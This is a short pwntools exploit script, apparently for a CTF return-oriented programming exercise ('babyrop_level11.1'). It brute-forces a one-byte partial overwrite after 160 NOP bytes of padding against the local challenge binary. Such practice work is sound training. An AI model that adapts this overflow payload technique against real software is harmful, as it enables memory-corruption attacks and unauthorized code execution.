from pwn import *
context.binary = "/challenge/babyrop_level11.1"
# p = process()
# p.recvuntil(b'located at: ')
# input_buffer = int(p.recvuntil(b'.').decode().strip('.'),base=16)
# log.success("Input buffer: %s", hex(input_buffer))
for i in range(0,256):
    p = process()
    temp = i
    payload = asm('nop')*160 + temp.to_bytes(1,'big')
    p.send(payload)
    time.sleep(1)
    print(p.recv().decode())
p.interactive()